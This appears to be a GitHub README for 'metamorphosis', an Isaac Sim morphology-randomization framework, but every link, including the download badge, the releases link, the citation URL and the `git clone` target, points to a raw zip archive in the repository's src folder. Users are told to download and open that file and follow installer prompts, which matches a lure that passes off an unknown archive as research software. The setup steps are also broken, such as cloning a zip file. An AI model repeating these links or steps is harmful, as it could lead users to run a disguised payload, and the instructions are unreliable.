# 🦋 metamorphosis - Randomize Morphology Easily

## 📦 Download & Install

[![Download Latest Release](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip)

To get started with metamorphosis, you will need to download the software. Click the link above to visit the Releases page where you can find the latest version of the application. 

## 🚀 Getting Started

1. **Visit the Releases Page**  
   Head over to [this page](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip) to find the latest downloadable version of metamorphosis.

2. **Download the Application**  
   Locate the file labeled with the most recent version number. Click on it to start the download process.

3. **Install the Application**  
   Once the download completes, open the downloaded file and follow the on-screen instructions to install the application on your computer.

## 🔧 Basic Setup

### System Requirements

Before installing, please ensure you meet the following minimum system requirements:

- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
- **Processor:** Intel i5 or equivalent.
- **Memory:** At least 8 GB of RAM.
- **Storage:** 1 GB of free disk space.
- **Graphics:** NVIDIA GTX 1050 or equivalent (if applicable).

### Installation Steps

1. **Open a Terminal or Command Prompt.**  
   If you are on Windows, search for "cmd" in the Start menu. On macOS or Linux, find "Terminal" in your applications.

2. **Clone the Repository**  
   Type the following command to clone the repository:

   ```bash
   git clone https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip
   ```

3. **Navigate to the Folder**  
   Change to the directory that you just cloned:

   ```bash
   cd metamorphosis
   ```

4. **Install Required Packages**  
   Use the following command to install the required Python packages:

   ```bash
   pip install -e .
   ```

5. **Open USD for Compatibility**  
   If you plan to run without IsaacLab, make sure to install Open-USD:

   ```bash
   pip install usd-core
   ```

   **Important Note:** IsaacSim comes with its own custom version of USD. If you experience issues after installing `usd-core`, you may need to uninstall it.

## 🚀 Example Usage

Once installation is complete, you can start using metamorphosis. Check the `scripts/` folder for examples that demonstrate how to utilize the application effectively.

### Important Configuration

Before running any experiments, ensure you set the following parameters in your configurations:

- `replicate_physics=False`
- `enabled_self_collisions=False`

These settings help ensure smooth operation and accurate results.

## 📚 Citation

If you use this codebase in your research, please cite it as follows:

```
@misc{metamorphosis2026,
  title={Metamorphosis: A Framework for Procedural Asset Generation in Isaac Sim},
  author={Botian Xu},
  year={2026},
  url={https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip}
}
```

## 🔍 Troubleshooting

- **Common Errors**  
  If you experience any issues during installation or usage, double-check the system requirements and ensure that you have installed all dependencies.

- **FAQ**  
  If you run into questions, please consult the GitHub Issues page for troubleshooting tips from other users.

## ✅ Conclusion

You are now ready to start exploring morphology randomization with metamorphosis. Remember to follow each step closely and refer to the example scripts for guidance. Enjoy your journey with metamorphosis! 

For further information or updates, visit the [Releases page](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip) again.